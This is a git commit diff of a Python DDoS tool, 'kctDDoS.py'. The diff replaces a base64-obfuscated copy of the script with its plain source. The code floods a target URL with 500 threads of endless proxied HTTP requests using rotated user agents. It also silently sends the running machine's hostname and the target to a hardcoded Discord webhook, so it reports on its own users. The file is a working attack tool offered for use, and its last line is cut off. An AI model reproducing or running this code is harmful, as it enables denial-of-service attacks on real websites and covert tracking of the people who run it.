a7adedd45bc934fb9ccff7928a7d8d6ade257389
Pradetor <141489645+e-pradetor@users.noreply.github.com>
2023-11-20 22:03:52 +0530

    kctDDoS.py

--- kctDDoS.py
+++ kctDDoS.py
@@ -1,61 +1,92 @@
-#This Tool Created by KERALACYBERTHUNDERS
+try:
+    import urllib.request, os, threading, time, random, sys
+    from discord_webhook import DiscordWebhook
+    import socket
+except ImportError:
+    if sys.platform.startswith("linux"):
+        os.system("pip3 install discord_webhook")
+    else:
+        os.system("pip install discord_webhook")
 
-dHJ5OgogICAgaW1wb3J0IHVybGxpYi5yZXF1ZXN0LCBvcywgdGhyZWFkaW5nLCB0aW1lLCByYW5k
-b20sIHN5cwogICAgZnJvbSBkaXNjb3JkX3dlYmhvb2sgaW1wb3J0IERpc2NvcmRXZWJob29rCiAg
-ICBpbXBvcnQgc29ja2V0CmV4Y2VwdCBJbXBvcnRFcnJvcjoKICAgIGlmIHN5cy5wbGF0Zm9ybS5z
-dGFydHN3aXRoKCJsaW51eCIpOgogICAgICAgIG9zLnN5c3RlbSgicGlwMyBpbnN0YWxsIGRpc2Nv
-cmRfd2ViaG9vayIpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgZGlz
-Y29yZF93ZWJob29rIikKCnVzbCA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8x
-MDkzNTk5MzA1Njg1Nzk0ODk2L3Z5NmJzLU53RG5MTmd2Y2hobmpFWnZsNDJoWm9tVWxXUnBlMUxa
-dTJ5ZXdsSXRubHFic0MtcXRmcVZUWHd6WHJZakltIgp1c2VyYWdlbnRzID0gWwogICAgIk1vemls
-bGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDEwLjA7IFdpbmRvd3MgTlQgNi4xOyBUcmlkZW50LzQu
-MDsgSW5mb1BhdGguMjsgU1YxOyAuTkVUIENMUiAyLjAuNTA3Mjc7IFdPVzY0KSIsCiAgICAiTW96
-aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgMTAuMDsgTWFjaW50b3NoOyBJbnRlbCBNYWMgT1Mg
-WCAxMF83XzM7IFRyaWRlbnQvNi4wKSIsCiAgICAiT3BlcmEvMTIuMChXaW5kb3dzIE5UIDUuMjtV
-O2VuKVByZXN0by8yMi45LjE2OCBWZXJzaW9uLzEyLjAwIiwKICAgICJPcGVyYS85LjgwIChXaW5k
-b3dzIE5UIDYuMCkgUHJlc3RvLzIuMTIuMzg4IFZlcnNpb24vMTIuMTQiLAogICAgIk1vemlsbGEv
-NS4wIChXaW5kb3dzIE5UIDYuMDsgcnY6Mi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQuMCBP
-cGVyYSAxMi4xNCIsCiAgICAiTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5k
-b3dzIE5UIDYuMCkgT3BlcmEgMTIuMTQiLAogICAgIk9wZXJhLzEyLjgwIChXaW5kb3dzIE5UIDUu
-MTsgVTsgZW4pIFByZXN0by8yLjEwLjI4OSBWZXJzaW9uLzEyLjAyIiwKICAgICJPcGVyYS85Ljgw
-IChXaW5kb3dzIE5UIDYuMTsgVTsgZXMtRVMpIFByZXN0by8yLjkuMTgxIFZlcnNpb24vMTIuMDAi
-LAogICAgIk9wZXJhLzkuODAgKFdpbmRvd3MgTlQgNS4xOyBVOyB6aC1zZykgUHJlc3RvLzIuOS4x
-ODEgVmVyc2lvbi8xMi4wMCIsCiAgICAiTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4w
-OyBXaW5kb3dzIFBob25lIE9TIDcuNTsgVHJpZGVudC81LjA7IElFTW9iaWxlLzkuMCkiLApdCgpj
-bGFzcyBGdWNrZXIodGhyZWFkaW5nLlRocmVhZCk6CgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHVy
-bCwgbnVtYmVyLCBwcm94eSk6CiAgICAgICAgdGhyZWFkaW5nLlRocmVhZC5fX2luaXRfXyhzZWxm
-KQogICAgICAgIHNlbGYudXJsID0gdXJsCiAgICAgICAgc2VsZi5udW0gPSBudW1iZXIKICAgICAg
-ICBzZWxmLmhlYWRlcnMgPSB7J1VzZXItQWdlbnQnOiByYW5kb20uY2hvaWNlKHVzZXJhZ2VudHMp
-fQogICAgICAgIHNlbGYubG9jayA9IHRocmVhZGluZy5Mb2NrKCkKICAgICAgICBzZWxmLnByb3h5
-ID0gcHJveHkKCiAgICBkZWYgcmVxdWVzdChzZWxmKToKICAgICAgICBkYXRhID0gTm9uZQogICAg
-ICAgIHByb3h5ID0gdXJsbGliLnJlcXVlc3QuUHJveHlIYW5kbGVyKHsnaHR0cCc6IHNlbGYucHJv
-eHl9KQogICAgICAgIG9wZW5lciA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSkK
-ICAgICAgICB1cmxsaWIucmVxdWVzdC5pbnN0YWxsX29wZW5lcihvcGVuZXIpCiAgICAgICAgcmVx
-ID0gdXJsbGliLnJlcXVlc3QuUmVxdWVzdChzZWxmLnVybCwgZGF0YSwgc2VsZi5oZWFkZXJzKQog
-ICAgICAgIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxKQogICAgICAgIHByaW50KCJbcGFja2V0
-IHNlbmRpbmddXHIiLCBlbmQ9IiIpCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICB3aGlsZSBU
-cnVlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZWxmLnJlcXVlc3QoKQogICAg
-ICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKCJwYWNrZXQg
-c2VuZGluZyBbJXNdXHIiICUgc2VsZi51cmwpCiAgICAgICAgICAgICAgICBzeXMuZXhpdCgwKQoK
-Y2xhc3MgTWFpbkxvb3AoKToKCiAgICBkZWYgaG9tZShzZWxmKToKICAgICAgICBwcmludCgKICAg
-ICAgICAgICAgIiIiCiBfICBfXyAgICBfICAgICAgXyAgICAgXyAgICAgICAgICAgCnwgfC8gL19f
-X3wgfF8gX198IHwgX198IHwgX19fICBfX18gCnwgJyAvLyBfX3wgX18vIF9gIHwvIF9gIHwvIF8g
-XC8gX198CnwgLiBcIChfX3wgfHwgKF98IHwgKF98IHwgKF8pIFxfXyBcXAp8X3xcX1xfX198XF9f
-XF9fLF98XF9fLF98XF9fXy98X19fLwoiIiIKICAgICAgICApCiAgICAgICAgdHJ5OgogICAgICAg
-ICAgICB1cmwgPSBzeXMuYXJndlsxXQogICAgICAgICAgICBoc3QgPSBzb2NrZXQuZ2V0aG9zdG5h
-bWUoKQogICAgICAgICAgICB3ZWJob29rID0gRGlzY29yZFdlYmhvb2soCiAgICAgICAgICAgICAg
-ICB1cmxzPXVzbCwgY29udGVudD1mJ3toc3R9IEhhcyBTdGFydGVkIEZsb29kIFRvIHt1cmx9Jwog
-ICAgICAgICAgICApCiAgICAgICAgICAgIHJlc3BvbnNlID0gd2ViaG9vay5leGVjdXRlKCkKICAg
-ICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtl
-fSIpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBmaWxlX3Byb3h5ID0gInByb3h5bGlzdC50eHQi
-CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlX3Byb3h5LCAiciIpIGFzIGluX2ZpbGU6CiAgICAg
-ICAgICAgICAgICBwcm94eV9saW5lcyA9IGluX2ZpbGUucmVhZGxpbmVzKCkKICAgICAgICBleGNl
-cHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiRXJyb3I6IHtlfSIpCiAgICAg
-ICAgbnVtX3RocmVhZHMgPSA1MDAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBpIGluIHJh
-bmdlKG51bV90aHJlYWRzKToKICAgICAgICAgICAgICAgIGluX2xpbmUgPSByYW5kb20uY2hvaWNl
-KHByb3h5X2xpbmVzKS5zdHJpcCgpCiAgICAgICAgICAgICAgICBGdWNrZXIodXJsLCBpICsgMSwg
-aW5fbGluZSkuc3RhcnQoKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAg
-ICAgcHJpbnQoZiJFcnJvcjoge2V9IikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBp
-ZiBzeXMucGxhdGZvcm0uc3RhcnRzd2l0aCgibGludXgiKToKICAgICAgICBvcy5zeXN0ZW0oImNs
-ZWFyIikKICAgIGVsc2U6CiAgICAgICAgb3Muc3lzdGVtKCJjbHMiKQogICAgTWFpbkxvb3AoKS5o
-b21lKA==
+usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
+useragents = [
+    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
+    "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
+    "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
+    "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
+    "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
+    "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
+    "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
+    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
+]
+
+class Fucker(threading.Thread):
+
+    def __init__(self, url, number, proxy):
+        threading.Thread.__init__(self)
+        self.url = url
+        self.num = number
+        self.headers = {'User-Agent': random.choice(useragents)}
+        self.lock = threading.Lock()
+        self.proxy = proxy
+
+    def request(self):
+        data = None
+        proxy = urllib.request.ProxyHandler({'http': self.proxy})
+        opener = urllib.request.build_opener(proxy)
+        urllib.request.install_opener(opener)
+        req = urllib.request.Request(self.url, data, self.headers)
+        urllib.request.urlopen(req)
+        print("[packet sending]\r", end="")
+
+    def run(self):
+        while True:
+            try:
+                self.request()
+            except:
+                sys.stdout.write("packet sending [%s]\r" % self.url)
+                sys.exit(0)
+
+class MainLoop():
+
+    def home(self):
+        print(
+            """
+ _  __    _      _     _           
+| |/ /___| |_ __| | __| | ___  ___ 
+| ' // __| __/ _` |/ _` |/ _ \/ __|
+| . \ (__| || (_| | (_| | (_) \__ \\
+|_|\_\___|\__\__,_|\__,_|\___/|___/
+"""
+        )
+        try:
+            url = sys.argv[1]
+            hst = socket.gethostname()
+            webhook = DiscordWebhook(
+                urls=usl, content=f'{hst} Has Started Flood To {url}'
+            )
+            response = webhook.execute()
+        except Exception as e:
+            print(f"Error: {e}")
+        try:
+            file_proxy = "proxylist.txt"
+            with open(file_proxy, "r") as in_file:
+                proxy_lines = in_file.readlines()
+        except Exception as e:
+            print(f"Error: {e}")
+        num_threads = 500
+        try:
+            for i in range(num_threads):
+                in_line = random.choice(proxy_lines).strip()
+                Fucker(url, i + 1, in_line).start()
+        except Exception as e:
+            print(f"Error: {e}")
+
+if __name__ == "__main__":
+    if sys.platform.startswith("linux"):
+        os.system("clear")
+    else:
+        os.system("cls")
+    MainLoop().home(
